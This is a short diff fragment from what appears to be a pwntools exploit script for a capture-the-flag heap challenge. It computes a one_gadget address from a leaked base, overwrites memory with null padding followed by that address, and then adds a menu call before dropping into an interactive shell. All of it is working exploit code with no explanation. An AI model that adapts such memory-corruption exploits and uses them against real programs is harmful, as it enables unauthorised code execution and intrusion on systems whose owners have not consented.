@@ -53,7 +53,8 @@ add(0x100,"\n")
 one=base+0xdfa31
 add(0x100,'\x00'*35+p64(one))
 #
+cmd(1)
+p.sendlineafter("ize:",'\n')
 p.interactive()
-
 
 
